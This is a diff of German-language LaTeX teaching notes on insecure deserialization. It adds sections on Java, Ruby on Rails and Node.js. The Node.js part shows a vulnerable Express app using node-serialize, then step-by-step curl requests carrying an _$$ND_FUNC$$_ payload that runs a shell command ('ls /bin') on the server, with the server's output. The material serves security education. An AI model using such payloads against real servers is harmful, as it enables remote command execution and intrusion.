@@ -530,6 +530,8 @@ Weitaus schwerwiegendere Angriffe sind ebenso möglich:
 	\item Es können auch serialisierte Objekte mit Objektreferenzen gebaut werden. Problematisch ist, dass die referenzierten Objekte während der Deserialisierung auch Daten wieder freigeben können, man über die Objektreferenz allerdings noch auf diese zugreifen kann. Dies führt zu \textit{use-after-free} Bugs die für \textit{memory corruption}-basierte Angriffe ausgenutzt werden können.
 \end{itemize}
 
+\subsection{Serialisierungsangriffe in Java}
+
 Serialisierung innerhalb des Java-Ökosystems besitzt das Problem, dass bei der Deserialisierung zuerst das de-serialisierte Objekt gebaut wird und erst danach der Typ, etc. des Objekts überprüft werden kann. Hier ein Beispiel:
 
 \begin{minted}{java}
@@ -558,7 +560,9 @@ for (int i = 0; i < 100; i++) {
 }
 \end{minted}
 
-Ruby (on Rails) besitzt leider auch eine längere Historie von Deserialiserungsangriffen. Ein Beispiel hierfür verwendet die Rails \textit{ERB} Klasse. Diese Klasse besitzt ein Element src in welchem Base64-codierter Source Code enthalten sein kann. Dieser Source Code wird bei Aufruf der Methode \textit{result} eines ERB-Objektes intern aufgerufen.
+\subsection{Serialisierungsangriffe in Ruby on Rails}
+
+Ruby (on Rails) besitzt eine längere Historie von Deserialiserungsangriffen. Ein Beispiel hierfür verwendet die Rails \textit{ERB} Klasse. Diese Klasse besitzt ein Element src in welchem Base64-codierter Source Code enthalten sein kann. Dieser Source Code wird bei Aufruf der Methode \textit{result} eines ERB-Objektes intern aufgerufen.
 
 Ruby verwendet ein in XML-eingepacktes JSON-Dokument als Serialisierungsformat. Ein Angreifer könnte z. B. folgendes Dokument bauen, welches einem serialisierten ERB Objekt entspricht:
 
@@ -577,6 +581,106 @@ PAYLOAD
 \end{minted}
 
 Der Code liest zuerst eine Payload aus einem File aus (der Pfad wird durch die Variable ARGV bereitgestellt) und erstellt dann ein Dokument welches ein serialisiertes ERB-Objekt beschreibt. Hier wurde nun src mit dem Schadcode befüllt und falls die Webapplikation, welche dieses serialisierte Objekt entgegen nimmt, nun das Objekt deserialisert und auf die \textit{result} Methode zugreift wird der bösartige Code des Angreifers ausgeführt. Dies entspricht einer Remote Command Injection, basierend auf einem Serialisierungsfehler.
+
+\subsection{Serialisierungsangriffe in Javascript / Node.js}
+
+Ein schönes Beispiel für Serialisierungsangriffe ist folgende \textit{node.js} Applikation welche die Serialisierungsbibliothek \textit{node-serialize} verwendet:
+
+\begin{minted}{javascript}
+const express = require('express');
+const bodyParser = require('body-parser');
+const serialize = require('node-serialize');
+
+const app = express();
+
+app.use(bodyParser.urlencoded({ extended: false }));
+
+app.post("/api/deserialize", function(req, res) {
+	var str = ""+req.body.fubar;
+	  const todo = serialize.unserialize(str);
+	  console.log(todo);
+	  res.send("wohoo!");
+});
+
+const server = app.listen(3000, function() {
+	  console.log("Server started! (Express.js)");
+
+		// Beispiel eines "normalen" serialisierten Objekts
+		const normal = {
+			todo: "some string"
+		};
+	  console.log("serialized normal object" + serialize.serialize(normal));
+});
+\end{minted}
+
+Bei diesem Beispiel wird vom Server als Parameter ,,fubar'' ein serialisiertes Objekt als Text entgegen genommen, deserialisiert und ausgegeben. Das erwartete serialisierte Object wird nun über das Kommandozeilentool \textit{curl} an den Server übertragen:
+
+\begin{minted}{shell}
+$ curl -X POST -d "fubar={\"todo\":\"some string\"}" http://localhost:3000/api/deserialize
+
+# Ausgabe am Server:
+Server started! (Express.js)
+serialized normal object: {"todo":"some string"}
+serialized attack code: {"todo":"_$$ND_FUNC$$_function() {\n\t\t\t\trequire('child_process').exec('ls /bin', function(error, stdout, stderr) {console.log(stdout)})\n\t\t\t}"}
+
+{ todo: 'some string' }
+\end{minted}
+
+In Javascript kann eine Klasse/Objekt auch eine Funktion als Element besitzen. Folgende Klasse inkludiert z.B. unter dem Namen ,,todo'' nicht ein Attribut, sondern eine ausführbare Funktion:
+
+\begin{minted}{javascript}
+	 	// Beispiel eines serialisierten Objekts mit einer aufrufbaren Funktion
+	  const todo = {
+			todo : function() {
+				// child_process kann verwendet werden um eine ausführbare Datei aufzurufen
+				require('child_process').exec('ls /bin', function(error, stdout, stderr) {console.log(stdout)})
+			}
+		};
+\end{minted}
+
+Wird diese Klasse serialisiert, wird folgender serialisierter Text erstellt:
+
+\begin{minted}{text}
+{"todo":"_$$ND_FUNC$$_function() {\n\t\t\t\trequire('child_process').exec('ls /bin', function(error, stdout, stderr) {console.log(stdout)})\n\t\t\t}"}
+\end{minted}
+
+Dieser inkludiert das Ausführen eines Befehls (,,ls /bin'') in der Hoffnung, dass beim deserialisieren dieser Befehl am Server aufgerufen werden würde. Dieses Kommando wird nun ebenso über curl an den Server übertragen:
+
+\begin{minted}{shell}
+# Die Zeichen \ und $ mussten teilweise maskiert werden
+$ curl -X POST -d "fubar={\"todo\":\"_\$\$ND_FUNC\$\$_function() {\n\t\t\t\trequire('child_process').exec('ls /bin', function(error, stdout, stderr) {console.log(stdout)})\n\t\t\t}\"}" http://localhost:3000/api/deserialize
+
+# Ausgabe am Server:
+
+{ todo: [Function (anonymous)] }
+\end{minted}
+
+Das Objekt wurde deserialisiert (inkl. der Methode mit dem Schadcode), würde diese Methode während der Request-Abarbeitung aufgerufen werden, würde unser Kommando am Server exekutiert werden. Wir können diesen Exploit noch verbessern indem wir durch Anhängen von ,,()'' nicht nur eine Funktion definieren, sondern diese auch direkt aufrufen. Dies würde folgendem serialiserten String bzw. folgendem Curl-Aufruf entsprechen:
+
+\begin{minted}{shell}
+$ curl -X POST -d "fubar={\"todo\":\"_\$\$ND_FUNC\$\$_function() {\n\t\t\t\trequire('child_process').exec('ls /bin', function(error, stdout, stderr) {console.log(stdout)})\n\t\t\t}()\"}" http://localhost:3000/api/deserialize
+\end{minted}
+
+Die Ausgabe am Server zeigt nun, dass das Kommando ausgeführt, und der Inhalt von \textit{/bin} ausgegeben wurde:
+
+\begin{minted}{text}
+{ todo: undefined }                                                                                                                         
+[                                                                                                                                           
+2to3-2.7                                                              
+aa-enabled                                                                                                                                  
+aa-exec                                                               
+aa-features-abi                                                       
+aconnect                                                              
+acpi_listen                                                           
+add-apt-repository                                                    
+addpart                                                               
+addr2line                                                             
+afm2pl                                                                
+afm2tfm                                                               
+ag                                                                    
+aleph
+...
+\end{minted}
 
 \subsection{Gegenmaßnahmen}
 
